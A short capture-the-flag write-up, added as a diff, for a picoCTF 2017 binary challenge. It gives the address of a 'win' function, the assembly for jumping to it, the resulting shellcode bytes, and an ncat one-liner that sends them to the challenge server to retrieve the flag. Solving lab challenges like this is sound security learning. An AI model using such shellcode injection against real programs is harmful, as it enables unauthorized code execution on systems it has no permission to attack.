@@ -1,0 +1,7 @@
+1. Find memory address of win function (ez, upload to oda and find win function address, 0x08048540)
+2. Use https://defuse.ca/online-x86-assembler.htm#disassembly to turn assembly into shellcode
+	2.1 Assembly must be of the form (for some reason you can't directly jump to a memory address due to different resulting interpreted addresses)
+		mov eax, 0x08048540
+		jmp eax
+3. Pipe into netcat using Kali:
+	echo -n -e "\xB8\x40\x85\x04\x08\xFF\xE0" | ncat shell2017.picoctf.com 18790 > flag.txt
